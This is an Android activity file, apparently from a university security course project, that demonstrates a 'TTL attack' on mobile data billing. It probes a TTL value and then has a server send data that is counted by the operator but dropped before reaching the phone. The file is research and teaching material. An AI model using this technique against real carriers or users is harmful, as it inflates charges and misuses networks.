package edu.osu.cse5469.hackcellular;

import android.app.ProgressDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Matrix;
import android.graphics.Paint;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.widget.Button;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.Switch;
import android.widget.TextView;

import java.io.IOException;
import java.io.InterruptedIOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.Timer;
import java.util.TimerTask;

import static java.lang.Thread.sleep;

/**
 * Created by fengyuhui on 15/10/9.
 * Data charging activity to show the TTL attack
 */

public class TTLActivity extends AppCompatActivity  {

    private Button sendSocketButton;
    private EditText desIP;
    private EditText ttlTime;
    private EditText volume;
    private ProgressDialog pd;
    private Switch switch1;
    private TextView textHint;
    private String serverAddr;
    private final static int portNum = 5555;
    private boolean bindPoint = true;
    private String ttl_manual;
    private String ttl;
    private String volume_manual;
    private String attackVolume;
    private final static int SERVER_MSG = 1;
    private final static int TTL_MSG = 2;
    private DataService dataService;
    private DatagramSocket client;
    private boolean switchDefaultIndex;

    private final static int LISTEN_PORT = 5501;
    private final static int TIMEOUT = 1000;

    /****************************** UI PART *********************************/

    /*
    *bind UI with functions
    */
    private void bindUI(){
        setContentView(R.layout.activity_ttl);

        // UI bind
        sendSocketButton = (Button) findViewById(R.id.sendButton);
        desIP = (EditText) findViewById(R.id.edited_ip);
        ttlTime = (EditText) findViewById(R.id.edited_ttl);
        volume = (EditText)findViewById(R.id.edited_volume);
        switch1 = (Switch)findViewById(R.id.switch1);
        textHint = (TextView) findViewById(R.id.textHint);
        surface = (SurfaceView)findViewById(R.id.surfaceView);
        surfaceHolder = surface.getHolder();

        // Intent content bing
        Intent intent = getIntent();
        serverAddr = intent.getStringExtra("severAddr");
        Log.d("debug", " " + serverAddr);

        // Configuration in default mode
        ttlTime.setFocusableInTouchMode(false);
        volume.setFocusableInTouchMode(false);
        switchDefaultIndex = true;
        DefaultOrMannual();
        ttlTime.addTextChangedListener(new TextWatcher() {

            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {

            }

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
            }

            @Override
            public void afterTextChanged(Editable s) {
                ttl_manual = ttlTime.getText().toString();
            }
        });

        volume.addTextChangedListener(new TextWatcher() {

            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {

            }

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
            }

            @Override
            public void afterTextChanged(Editable s) {
                volume_manual = volume.getText().toString();
            }
        });
    }

    private void DefaultOrMannual(){
        switch1.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if (isChecked) {
                    ttlTime.setFocusableInTouchMode(false);
                    volume.setFocusableInTouchMode(false);
                    switchDefaultIndex = true;
                } else {
                    ttlTime.setFocusableInTouchMode(true);
                    volume.setFocusableInTouchMode(true);
                    switchDefaultIndex = false;
                }
            }
        });
    }

    /****************************** Service PART *********************************/

    private ServiceConnection dataServiceConnection = new ServiceConnection() {

        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {                       //connect Service
            dataService = ((DataService.DataServiceIBinder) (service)).getService();
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {                 //disconnect Service
            dataService = null;
        }
    };

    private void bindService() {                                                                    //bind service and call onBind() in Service
        final Intent intent = new Intent(this,DataService.class);
        bindService(intent, dataServiceConnection, Context.BIND_AUTO_CREATE);                       // bindService
    }

    /****************************** SurfaceView PART *********************************/

    /*
     *Variables for drawing
     */
    private SurfaceHolder surfaceHolder;
    private SurfaceView surface;
    private Paint localdataPaint=new Paint(),opdataPaint=new Paint(),axisPaint=new Paint(),opbarPaint=new Paint(),userbarPaint=new Paint(),textPaint=new Paint();
    private Matrix bgMatrix;
    private int heightCanvas;
    private int widthCanvas;
    private int xSplit=30;
    private int lengthXAxis;
    private int lengthYAxis;
    private int wordlength;

    private int offsetAxis;
    private Timer timer = new Timer();
    TimerTask task= new TimerTask(){
        public void run() {
            Canvas canvas = null;
            synchronized (surfaceHolder) {
                canvas = surfaceHolder.lockCanvas();


                axisPaint.setColor(Color.argb(255, 0, 0, 0));
                axisPaint.setStrokeWidth(3);
                localdataPaint.setColor(Color.argb(255, 0, 0, 255));
                localdataPaint.setStrokeWidth(3);

                opdataPaint.setColor(Color.argb(255, 255, 0, 0));
                opdataPaint.setStrokeWidth(3);
                opdataPaint.setStyle(Paint.Style.STROKE);

                userbarPaint.setColor(Color.argb(180, 0, 0, 255));
                userbarPaint.setStrokeWidth(3);
                opbarPaint.setColor(Color.argb(180, 255, 0, 0));
                opbarPaint.setStrokeWidth(5);

                textPaint.setColor(Color.argb(255, 0, 0, 0));


                if(canvas!=null){
                    retrieveSize(canvas);
                    drawAxies(axisPaint, canvas);
                    drawData(localdataPaint,opdataPaint,canvas);
                }

                if(canvas!=null) surfaceHolder.unlockCanvasAndPost(canvas);
            }
        }
    };

    private void drawAxies(Paint axisPaint,Canvas canvas){
        canvas.drawColor(Color.argb(255, 230, 230, 230));
        int xstart=offsetAxis+wordlength;
        int ystart=offsetAxis+lengthYAxis;
        canvas.drawLine(xstart, offsetAxis, xstart, ystart, axisPaint);
        canvas.drawLine(xstart, ystart,xstart+lengthXAxis, ystart, axisPaint);
        canvas.drawText("MB", offsetAxis/8, 2 * offsetAxis, textPaint);
        canvas.drawText("0",xstart/3,ystart,textPaint);
        for (int i=0;i<=5;i++){
            canvas.drawLine(xstart, ystart - lengthYAxis / 5 * i, xstart + offsetAxis, ystart - lengthYAxis / 5 * i, axisPaint);
        }

        for (int i=0;i<xSplit;i++){
            canvas.drawLine(xstart + lengthXAxis / xSplit * i, ystart, xstart + lengthXAxis / xSplit * i, ystart - offsetAxis, axisPaint);
        }
    }

    private void drawData(Paint localdataPaint,Paint opdataPaint,Canvas canvas){
        PlotData tmpPlotData =new PlotData();
        PlotData plotData =dataService.datausage;
        long largestData=-1;
        if(plotData.size()>1);
        for(int i=(plotData.size()-xSplit)>1?(plotData.size()-xSplit):1;i< plotData.size();i++) {
            long tmpopusage=(plotData.getData(i).getOperator_data()- plotData.getData(0).getOperator_data());
            long tmplocalusage=(plotData.getData(i).getLocal_data()- plotData.getData(0).getLocal_data());
            Log.d("Usage ","opusage:"+(float)tmpopusage/ 1024 / 1024+" localusage:"+(float)tmplocalusage/ 1024 / 1024);
            tmpPlotData.addData(new VolumeData(plotData.getData(i).getTimeStamp(),tmplocalusage,tmpopusage));
            largestData=largestData>tmplocalusage?largestData:tmplocalusage;
            largestData=largestData>tmpopusage?largestData:tmpopusage;
        }
        for(int i=1;i<6;i++) {
            canvas.drawText(String.format("%.2f", (float) largestData / 1024 / 1024/5*i), 2 * offsetAxis + wordlength, offsetAxis+lengthYAxis-i*lengthYAxis/5+offsetAxis, textPaint);
        }
        float lastx=0,lasty=0;
        for(int i=0;i< tmpPlotData.size();i++) {
            float tmpx=offsetAxis+lengthXAxis/xSplit*i+wordlength;
            float tmpyLocal=offsetAxis+lengthYAxis-((float) tmpPlotData.getData(i).getLocal_data()/(float)largestData)*lengthYAxis;
            float tmpyOP=offsetAxis+lengthYAxis-((float) tmpPlotData.getData(i).getOperator_data()/(float)largestData)*lengthYAxis;
            //Log.d("Y",""+tmpyLocal+" "+tmpyOP);
            canvas.drawCircle(tmpx, tmpyLocal, 5, localdataPaint);
            canvas.drawCircle(tmpx,tmpyOP,8,opdataPaint);
            canvas.drawLine(tmpx, offsetAxis+lengthYAxis, tmpx, tmpyLocal, userbarPaint);
            if(i!=0)  canvas.drawLine(lastx,lasty, tmpx,tmpyOP, opbarPaint);
            lastx=tmpx;
            lasty=tmpyOP;
        }
    }

    class surfaceCreateThread extends Thread{
        public void run(){
            Canvas canvas = null;
            synchronized (surfaceHolder) {
                canvas = surfaceHolder.lockCanvas();// lock canvas for drawing and retrieving params
                retrieveSize(canvas);
                surfaceHolder.unlockCanvasAndPost(canvas);
              //  Log.v("Canvas", heightCanvas+" "+widthCanvas);
            }
        }
    }

    public void retrieveSize(Canvas canvas){

        heightCanvas=canvas.getHeight();
        widthCanvas=canvas.getWidth();
        offsetAxis=widthCanvas/50;
        wordlength=widthCanvas/30;
        textPaint.setTextSize(widthCanvas/30);
        lengthXAxis=widthCanvas-2*offsetAxis-wordlength;
        lengthYAxis=heightCanvas-2*offsetAxis;
        canvas.drawColor(Color.argb(255, 230, 230, 230));

    }

    private void bindsurfaceCallBack(){
        surfaceHolder.addCallback(new SurfaceHolder.Callback() {
            public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {

            }

            @Override
            public void surfaceCreated(SurfaceHolder holder) {
                surfaceCreateThread mThread = new surfaceCreateThread();
                mThread.start();
            }

            @Override
            public void surfaceDestroyed(SurfaceHolder holder) {
                // TODO Auto-generated method stub

            }
        });
    }


   protected void Destroy(){
       super.onDestroy();
        timer.cancel();
        unbindService(dataServiceConnection);

   }


    /****************************** Function PART *********************************/

    /*
    * Handler for info exchange between UI and Thread
    */
    private Handler handler = new Handler(){
        @Override
        public void handleMessage(Message msg) {
            if(msg.what == SERVER_MSG){
                textHint.setText((String) msg.obj);
            }
            if(msg.what == TTL_MSG){
                ttlTime.setText((String) msg.obj);
            }
        }
    };

    /*
    * Attack button listener
    */
    class AttckClickListener implements View.OnClickListener {
        @Override
        public void onClick(View v) {
//            serverAddr = desIP.getText().toString();
//            Log.d("debug", " " + serverAddr);

            if(bindPoint) {
                bindPoint = false;
                bindService();
                timer.schedule(task, 10000, 10000);
            }

            new SendfeedbackJob().execute();

            // Issue: set ttl to UI show

        }
    }
    /*
     * To protect prevent the error of network operating on main thread.
     */
    private class SendfeedbackJob extends AsyncTask<String, Void, String>{

        @Override
        protected String doInBackground(String... params) {

            // Create Server Address
            InetAddress intetServerAddr = null;
            try {
                intetServerAddr = InetAddress.getByName(serverAddr);
            } catch (UnknownHostException e) {
                e.printStackTrace();
            }

            Message sendMsg = Message.obtain();
            sendMsg.obj = "Start Attacking...";
            sendMsg.what = SERVER_MSG;
            handler.sendMessage(sendMsg);

            if(switchDefaultIndex){
                ttl = "30";
                attackVolume = "3";
            }
            else {
                ttl = ttl_manual;
                attackVolume = volume_manual;
            }

            // Flush the receiver buffer
            try {
                while (true) {
                    client.setSoTimeout((TIMEOUT/4));
                    byte[] inData = new byte[3000];
                    DatagramPacket inPacket = new DatagramPacket(inData, inData.length);
                    try {
                        client.receive(inPacket);
                        String result = new String(inPacket.getData(), inPacket.getOffset(), inPacket.getLength());
                        if (result.length() > 0) {
                            Log.d("debug", "Received length is " + result.length());
                        }
                    } catch (InterruptedIOException e) {
                        Log.d("debug", "Receiving queue has flushed.");
                        break;
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }

            try {
                sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            // If in default mode, then check valid TTL
            if(switchDefaultIndex) {
                Boolean ttlValid = false;
                while (!ttlValid) {
                    Log.d("debug", "TTL is " + ttl);
                    try {
                        String probeInfo = ttl + "," + "0";
                        // Send UDP packet
                        DatagramPacket sendPacket = new DatagramPacket(probeInfo.getBytes(), probeInfo.length(), intetServerAddr, portNum);
                        client.send(sendPacket);

                        // Receive UDP packet
                        Boolean receivedPacket = false;
                        while (true) {
                            client.setSoTimeout(TIMEOUT);
                            byte[] inData = new byte[3000];
                            DatagramPacket inPacket = new DatagramPacket(inData, inData.length);
                            try {
                                client.receive(inPacket);
                                String result = new String(inPacket.getData(), inPacket.getOffset(), inPacket.getLength());
                                if (result.length() > 0) {
                                    receivedPacket = true;                                                  // If received anything, set indicator to reduce ttl
                                    Log.d("debug", "Received length is " + result.length());
                                }
                            } catch (InterruptedIOException e) {
                                Log.d("debug", "Timeout! No packet received.");
                                break;
                            }
                        }
                        if (receivedPacket) {
                            ttl = Integer.toString(Integer.parseInt(ttl) - 1);
                        } else {
                            ttlValid = true;
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
                // Update most recent valid ttl to EditText
                Message ttlMsg = Message.obtain();
                ttlMsg.obj = ttl;
                ttlMsg.what = TTL_MSG;
                handler.sendMessage(ttlMsg);
            }

            // Start Attack
            Log.d("debug", "TTL is " + ttl);
            String attackInfo = ttl + "," + attackVolume;
            DatagramPacket sendPacket = new DatagramPacket(attackInfo.getBytes(), attackInfo.length(), intetServerAddr, portNum);
            try {
                client.send(sendPacket);
            } catch (IOException e) {
                e.printStackTrace();
            }
            // Check attack validation
            String textViewShow = "";
            try {
                // Receive UDP packet
                Boolean receivedPacket = false;
                while (true) {
                    client.setSoTimeout(TIMEOUT);
                    byte[] inData = new byte[3000];
                    DatagramPacket inPacket = new DatagramPacket(inData, inData.length);
                    try {
                        client.receive(inPacket);
                        String result = new String(inPacket.getData(), inPacket.getOffset(), inPacket.getLength());
                        if (result.length() > 0) {
                            receivedPacket = true;                                                  // If received anything, set indicator to reduce ttl
                            Log.d("debug", "Received length is " + result.length());
                        }
                    } catch (InterruptedIOException e) {
                        Log.d("debug", "Timeout! No packet received.");
                        break;
                    }
                }
                if (receivedPacket) {
                    textViewShow = attackVolume+"MB Attack Start, with TTL: " + ttl + ". But this is not a valid attack";
                } else {
                    textViewShow = attackVolume+"MB Attack Start, with TTL: " + ttl + ".";
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
            Message msg = Message.obtain();
            msg.obj = textViewShow;
            msg.what = SERVER_MSG;
            handler.sendMessage(msg);

            return null;
        }
    }

    /****************************** Lifecycle PART *********************************/

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        bindUI();
        bindsurfaceCallBack();

        // Create UDP socket
        try {
            client = new DatagramSocket(LISTEN_PORT);
        } catch (SocketException e) {
            e.printStackTrace();
        }
        ttl_manual = ttlTime.getText().toString();
        volume_manual = volume.getText().toString();
        sendSocketButton.setOnClickListener(new AttckClickListener());
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_ttl, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }
}
